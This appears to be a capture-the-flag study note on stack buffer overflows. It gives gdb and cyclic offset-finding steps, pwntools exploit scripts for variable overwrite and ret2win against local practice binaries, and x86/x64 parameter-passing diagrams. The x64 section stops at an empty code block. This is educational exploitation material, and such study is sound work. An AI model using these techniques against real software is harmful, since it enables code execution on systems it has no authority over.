# Buffer Overflow

## Variable Overwrite
Identifying offset to overwrite variable

Listing Stack
By listing stack we can identify where our input is (for example `0x41414141`).
```
(gdb) x/100xw $esp
(gdb) x/100xg $rsp
```

Examining Base Pointer and Variable to Overwrite
```
(gdb) x/xw $ebp
(gdb) x/xg $rbp

(gdb) x/xw $ebp-0xc
(gdb) x/xg $rbp-0xc
```
We can find the printed address on the stack.

Exploit for variable overwrite
```
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
p = process(["./vuln"])

payload = b"A" * 32 # set offset here
payload += p32(0xdeadbeef) #p64() for x64

p.sendline(payload)
p.interactive()
```

## Return Pointer(EIP/RIP) Overwrite
Locating offset to reach the return pointer
```
cyclic 100
cyclic -l faaa
```
or you can choose the method used in variable overwrite

How do we find the address of our destination?
If PIE is not enabled
```
objdump -t file
(gdb) info functions
```

Basic return to win without parameter
```
from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)
p = process(["./ret2win"])

offset = 24;
payload = b"A" * offset
payload += b"B" * 4
payload += p32(0x08049182)

p.sendline(payload)
p.interactive()
```

## Return Pointer(EIP/RIP) Overwrite with Parameters

For x86

To identify if an instruction set takes parameter from the stack, `disassemble` the function and look for

```
DWORD PTR [ebp+0x8],0xdeadbeef //ebp+0x4 is for return address
DWORD PTR [ebp+0xc],0xc0debabe //ebp+0x4 is for return address
```

```
+----------------------------+
|      second parameter      |
+----------------------------+
|      first parameter       |
+----------------------------+
|           main()           | //can be any other address to return after our desired function has successfully existed
+----------------------------+
|       return address       |
+----------------------------+
|      stored ebp value      |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
```

exploit
```
from pwn import *

elf = context.binary = ELF("./ret2win_params", checksec=False)
p = process(["./ret2win_params"])

offset = 24;
payload = b"A" * offset
payload += b"B" * 4
payload += p32(0x08049182) # hacked()
payload += p32(0x0804922b) # main()
payload += p32(0xdeadbeef) # para1
payload += p32(0xc0debabe) # para2

p.sendline(payload)
p.interactive()
```


For x64

```
+----------------------------+
|        return address      |
+----------------------------+
|        second param        |
+----------------------------+
|        pop rsi; ret;       |
+----------------------------+
|        first param         |  rdi = 1st param
+----------------------------+  rsi = 2nd param
|        pop rdi; ret;       |  rdx = 3rd param
+----------------------------+  rcx = 4th param
|      stored ebp value      |   r8 = 5th param
+----------------------------+   r9 = 6th param
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|   7th, 8th, 9th, etc are pushed onto the stack
+----------------------------+
```
```








